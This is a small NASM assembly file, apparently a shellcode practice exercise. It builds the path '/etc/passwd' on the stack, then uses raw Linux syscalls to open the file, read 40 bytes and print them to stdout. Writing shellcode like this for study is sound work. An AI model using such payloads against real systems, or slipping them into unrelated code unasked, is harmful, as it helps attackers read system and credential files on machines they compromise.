; nasm -f elf32 shellcode04.asm -o shellcode04.o && ld -m elf_i386 shellcode04.o -o ./shellcode04 && ./shellcode04

section .bss
    buffer resb 40

section .text
    global _start

_start:
    ; build "/etc/passwd" on the stack
    xor eax, eax
    push eax                ; null terminator
    push dword 0x64777373   ; "sswd"
    push dword 0x61702f63   ; "c/pa"
    push dword 0x74652f2f   ; "//et"

    ; open(filename, O_RDONLY, 0)
    mov eax, 5          ; sys_open
    mov ebx, esp        ; filename pointer
    mov ecx, 0          ; O_RDONLY
    mov edx, 0          ; mode (none)
    int 0x80

    mov esi, eax        ; save file descriptor

    ; read(fd, buffer, 40)
    mov eax, 3          ; sys_read
    mov ebx, esi        ; fd
    mov ecx, buffer     ; buffer
    mov edx, 40         ; count
    int 0x80

    ; write(1, buffer, bytes_read)
    mov eax, 4          ; sys_write
    mov ebx, 1          ; stdout
    mov ecx, buffer
    mov edx, 40
    int 0x80

    ; exit(0)
    mov eax, 1          ; sys_exit
    xor ebx, ebx
    int 0x80